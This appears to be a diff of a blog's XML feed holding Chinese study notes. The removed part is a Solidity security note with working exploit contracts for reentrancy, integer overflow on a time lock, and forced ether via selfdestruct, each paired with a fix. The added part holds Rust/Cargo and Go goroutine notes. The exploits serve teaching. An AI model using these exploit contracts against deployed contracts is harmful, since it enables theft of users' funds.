class="line">        etherstore = EtherStore(_etherstoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        if (address(etherstore).balance &gt;= 1 ether)&#123;</span><br><span class="line">        // 调用</span><br><span class="line">            etherstore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherstore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherstore.withdraw();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调用withdraw()之后，一直就调用fallback(),然后调用withdraw(),可以跳过判断</p>
-<h1 id="Arithmetic-overflow-ans-underflow"><a href="#Arithmetic-overflow-ans-underflow" class="headerlink" title="Arithmetic overflow ans underflow"></a>Arithmetic overflow ans underflow</h1><p>uint &#x3D; uint 256 </p>
-<p>$$ 0&lt;&#x3D; x &lt;&#x3D; 2^{256}  -1  $$</p>
-<ul>
-<li>overflow&#x2F;underflow</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt;uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime ;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable&#123;</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] +=msg.value ;</span><br><span class="line"></span><br><span class="line">        lockTime[msg.sender] =now +1 weeks;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _second) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">       require(balances[msg.sender] &gt; 0,&quot;insufficient funds&quot;);</span><br><span class="line">       require(now &gt; lockTime[msg.sender],&quot;  lock time not expired&quot;);</span><br><span class="line">   </span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line"></span><br><span class="line">        (bool successs, )= msg.sender.call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        require(successs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Attack&#123;</span><br><span class="line">     TimeLock timelock;</span><br><span class="line"></span><br><span class="line">     constructor(TimeLock _timelock) public&#123;</span><br><span class="line">         timelock= TimeLock(_timelock);</span><br><span class="line">     &#125;</span><br><span class="line">     // 收款也需要payable </span><br><span class="line">     fallback() external payable&#123;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function attach() public payable&#123;</span><br><span class="line">         timelock.deposit&#123;value:msg.value&#125;();</span><br><span class="line">         //t ==current lock time </span><br><span class="line">         //find x such that </span><br><span class="line">         // x+ t = 2 **256 =0</span><br><span class="line">         // x= -t</span><br><span class="line">         timelock.increaseLockTime(</span><br><span class="line">             uint(-timelock.lockTime(address(this)))</span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">         timelock.withdraw();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
-<li>通过引入安全库。safemath</li>
-</ul>
-<h1 id="Forcefully-send-ether-with-selfdestruct"><a href="#Forcefully-send-ether-with-selfdestruct" class="headerlink" title="Forcefully send ether with selfdestruct"></a>Forcefully send ether with selfdestruct</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract EthGamer&#123;</span><br><span class="line"></span><br><span class="line">     uint public targeAmount = 7 ether;</span><br><span class="line"></span><br><span class="line">     address public winner ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">          require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">          uint balance = address(this).balance;</span><br><span class="line"></span><br><span class="line">          require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">          if(balance==targeAmount)&#123;</span><br><span class="line">              winner= msg.sender;</span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function claimReward() public &#123;</span><br><span class="line"></span><br><span class="line">         require(msg.sender == winner , &quot;not winner&quot;);</span><br><span class="line"></span><br><span class="line">         (bool sent ,) = msg.sender.call&#123;value:address(this).balance&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">         require(sent,&quot;failed&quot;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">   function attack(address payable _target) public payable&#123;</span><br><span class="line"></span><br><span class="line">       selfdestruct(_target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>attack 会调用deposite ,然后会触发winner,结果winner是address:0x0000000000000000000000000000000000000000</p>
-</li>
-<li><p>deposit()方法中加入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint public balance;</span><br><span class="line"></span><br><span class="line">function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">     require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line">     </span><br><span class="line">      balance +=msg.value;</span><br><span class="line"></span><br><span class="line">     require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">     if(balance==targeAmount)&#123;</span><br><span class="line">         winner= msg.sender;</span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="access-private-data"><a href="#access-private-data" class="headerlink" title="access private data"></a>access private data</h1><p>0x3505a02BCDFbb225988161a95528bfDb279faD6b</p>
-]]></content>
   </entry>
   <entry>
     <title>Time value of money</title>
@@ -756,12 +818,56 @@
 <li>undelying trends over time</li>
 </ul>
 <h3 id="Word-cloud-Unstructured"><a href="#Word-cloud-Unstructured" class="headerlink" title="Word cloud: Unstructured"></a>Word cloud: Unstructured</h3><p><img src="/images/CFA/2.png" alt="image"></p>
-]]></content>
+<h1 id="Measures-of-central-Tendency"><a href="#Measures-of-central-Tendency" class="headerlink" title="Measures of central Tendency"></a>Measures of central Tendency</h1>]]></content>
       <categories>
         <category>CFA</category>
       </categories>
       <tags>
         <tag>Time value of money</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rust</title>
+    <url>/2021/04/27/rust/</url>
+    <content><![CDATA[<h1 id="mac安装"><a href="#mac安装" class="headerlink" title="mac安装"></a>mac安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install ca-certificates</span><br><span class="line">brew install rust</span><br></pre></td></tr></table></figure>
+
+<h1 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main()&#123;</span><br><span class="line">    println!(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustc hello.rs</span><br><span class="line">./hello</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><ul>
+<li><p>Cargo是Rust的构建系统和包管理工具</p>
+<ul>
+<li>构建代码 下载依赖库 构建这些库</li>
+</ul>
+</li>
+<li><p>证明是否被安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro Demo % cargo version</span><br><span class="line">cargo 1.59.0</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用cargo创建项目</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo new hello_cargo</span><br></pre></td></tr></table></figure>
+<p>生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro hello_cargo % tree   </span><br><span class="line">.</span><br><span class="line">├── Cargo.toml</span><br><span class="line">└── src</span><br><span class="line">    └── main.rs</span><br><span class="line"></span><br><span class="line">1 directory, 2 files</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Cargo.toml文件</li>
+</ul>
+<p>配置包 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[package]</span><br><span class="line">name = &quot;hello_cargo&quot;</span><br><span class="line">version = &quot;0.1.0&quot;</span><br><span class="line">edition = &quot;2021&quot;</span><br><span class="line"></span><br><span class="line"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><span class="line"></span><br><span class="line">[dependencies]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edition 版本</p>
+<p>在代码的包叫crate</p>
+<h2 id="构建cargo项目"><a href="#构建cargo项目" class="headerlink" title="构建cargo项目"></a>构建cargo项目</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build </span><br></pre></td></tr></table></figure>
+
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo run xx</span><br></pre></td></tr></table></figure>
+<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo check </span><br></pre></td></tr></table></figure>
+<p>cargo check 比 cargo build 快的多</p>
+<h2 id="为发布构建"><a href="#为发布构建" class="headerlink" title="为发布构建"></a>为发布构建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build --release </span><br></pre></td></tr></table></figure>
+<p>编译进行优化，发布使用</p>
+]]></content>
+      <tags>
+        <tag>Rust</tag>
       </tags>
   </entry>
   <entry>
@@ -988,50 +1094,6 @@
       </tags>
   </entry>
   <entry>
-    <title>rust</title>
-    <url>/2021/04/27/rust/</url>
-    <content><![CDATA[<h1 id="mac安装"><a href="#mac安装" class="headerlink" title="mac安装"></a>mac安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install ca-certificates</span><br><span class="line">brew install rust</span><br></pre></td></tr></table></figure>
-
-<h1 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main()&#123;</span><br><span class="line">    println!(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustc hello.rs</span><br><span class="line">./hello</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><ul>
-<li><p>Cargo是Rust的构建系统和包管理工具</p>
-<ul>
-<li>构建代码 下载依赖库 构建这些库</li>
-</ul>
-</li>
-<li><p>证明是否被安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro Demo % cargo version</span><br><span class="line">cargo 1.59.0</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用cargo创建项目</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo new hello_cargo</span><br></pre></td></tr></table></figure>
-<p>生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro hello_cargo % tree   </span><br><span class="line">.</span><br><span class="line">├── Cargo.toml</span><br><span class="line">└── src</span><br><span class="line">    └── main.rs</span><br><span class="line"></span><br><span class="line">1 directory, 2 files</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Cargo.toml文件</li>
-</ul>
-<p>配置包 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[package]</span><br><span class="line">name = &quot;hello_cargo&quot;</span><br><span class="line">version = &quot;0.1.0&quot;</span><br><span class="line">edition = &quot;2021&quot;</span><br><span class="line"></span><br><span class="line"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><span class="line"></span><br><span class="line">[dependencies]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>edition 版本</p>
-<p>在代码的包叫crate</p>
-<h2 id="构建cargo项目"><a href="#构建cargo项目" class="headerlink" title="构建cargo项目"></a>构建cargo项目</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build </span><br></pre></td></tr></table></figure>
-
-<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo run xx</span><br></pre></td></tr></table></figure>
-<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo check </span><br></pre></td></tr></table></figure>
-<p>cargo check 比 cargo build 快的多</p>
-<h2 id="为发布构建"><a href="#为发布构建" class="headerlink" title="为发布构建"></a>为发布构建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build --release </span><br></pre></td></tr></table></figure>
-<p>编译进行优化，发布使用</p>
-]]></content>
-      <tags>
-        <tag>Rust</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>tick</title>
     <url>/2022/03/05/tick/</url>
     <content><![CDATA[<h1 id="虚拟流动性"><a href="#虚拟流动性" class="headerlink" title="虚拟流动性"></a>虚拟流动性</h1><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.308ex" xmlns="http://www.w3.org/2000/svg" width="28.587ex" height="5.382ex" role="img" focusable="false" viewBox="0 -1359 12635.4 2379"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1183.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(2183.4,0)"><g data-mml-node="mi" transform="translate(820.2,676)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="msqrt" transform="translate(220,-850.1)"><g transform="translate(853,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,30.1)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="1028.3" height="60" x="853" y="770.1"></rect></g><rect width="2081.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(4504.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4893.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5282.8,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5995,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6995.2,0)"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7676.2,0)"><g data-mml-node="msqrt"><g transform="translate(1020,0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,128.2)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="1099.1" height="60" x="1020" y="918.2"></rect></g></g><g data-mml-node="mo" transform="translate(9795.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10462.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(11517.9,0)"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mn" transform="translate(714,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container></p>
@@ -1116,6 +1178,34 @@
       </categories>
       <tags>
         <tag>Uniswap V3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>go-channel</title>
+    <url>/2022/01/26/go-channel/</url>
+    <content><![CDATA[<h1 id="go-并发"><a href="#go-并发" class="headerlink" title="go-并发"></a>go-并发</h1><p>java开启线程 需要消耗1MB<br>go 开启协成 需要消耗2KB</p>
+<h2 id="通过状态检查器"><a href="#通过状态检查器" class="headerlink" title="通过状态检查器"></a>通过状态检查器</h2><p>不断获取切片中的link,并且打印出来<br>按照顺序执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		checkLink(link)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/go/1.png" alt="image"></p>
+<h2 id="如果我想要同时执行它们"><a href="#如果我想要同时执行它们" class="headerlink" title="如果我想要同时执行它们"></a>如果我想要同时执行它们</h2><p>在函数的前面加入了go关键字，代表开辟新的协程</p>
+<p>Main routine ,当运行到go的时候，开辟新的协程 。<br>每一个 go协程不影响 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>为什么一瞬间终止呢？因为main协程终止，子协程就会被销毁 。 </p>
+<p><img src="/images/go/2.png" alt="image"></p>
+<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>实现协程之间的通信 </p>
